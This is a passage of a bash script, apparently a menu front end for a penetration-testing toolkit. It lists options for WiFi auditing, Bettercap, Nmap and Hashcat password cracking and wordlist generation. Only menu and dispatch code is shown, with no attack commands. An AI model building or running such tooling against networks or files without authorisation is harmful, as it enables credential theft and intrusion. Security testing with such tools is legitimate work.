		clear
		print_banners
		
        printf "${MAGENTA}1.Select File To Crack${NC}\n"
        printf "${MAGENTA}2.Generate a Wordlist${NC}\n"
        printf "${MAGENTA}3.Clear Temporary File${NC}\n"
        printf "${RED}0.Main Menu${NC}\n"

        read -rp "$(printf "${GREEN}Make Choice =>${NC}")" read

        case $read in 
            1)crack;;
            2)generate;;
            3)delete;;
            0) return 0 ;;
            *) read -rp "$(printf "${RED}Choose correct option [ENTER]${NC}")"

        esac 
    done
}
# ══════════════════════════════════════════════════════════════════════════════
# MAIN MENU Logic
# ══════════════════════════════════════════════════════════════════════════════

run

while true; do
		    clear
			prin_banner
			workflow
    
		
		into "1) WIFI Audit Script"
		into "2) BETTERCAP Script"
		into "3) NMAP Script"
		#into "4) METASPLOIT Script"
		into "5) HASHCAT Script"
		out "0) EXIT"
		
		read -rp "$(printf "${BOLD}${DIM}${GREEN}Choose any option ==>${NC}\t")" choice
		
		case $choice in 
			
			1)wifi_menu;;
			
			2)bettercap_menu;;
			
			3)nmap_menu;;
			
			#4)meta_menu;;
			
			5)crack_menu;;
			
			0) to "Have a Nice Day"
				break;;
				
			*) read -rp "$(printf "${RED}Choose correct option [ENTER]${NC}")"
				continue ;;
		esac

 done

